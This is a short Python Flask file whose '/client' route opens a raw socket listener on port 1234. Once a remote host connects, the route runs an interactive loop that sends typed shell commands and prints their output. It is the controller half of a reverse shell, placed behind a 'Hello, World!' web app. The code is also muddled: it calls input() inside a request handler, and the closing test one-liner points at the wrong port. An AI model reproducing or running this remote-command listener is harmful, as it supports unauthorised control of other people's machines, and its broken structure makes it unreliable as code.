import socket
from flask import Flask, send_file, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return "Hello, World!"

@app.route('/client')
def client():
    SERVER_HOST = "0.0.0.0" #host ip
    SERVER_PORT = 1234
    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
    SEPARATOR = "<sep>"

    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")

    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)

    while True:
        command = input(f"{cwd} $> ")
        if not command.strip():
            continue
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)

    return "Client connection closed."

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)

# run this in shell $ python -c "import socket; s = socket.socket(); s.connect(('localhost', 5000)); s.send('test'.encode()); s.close()"
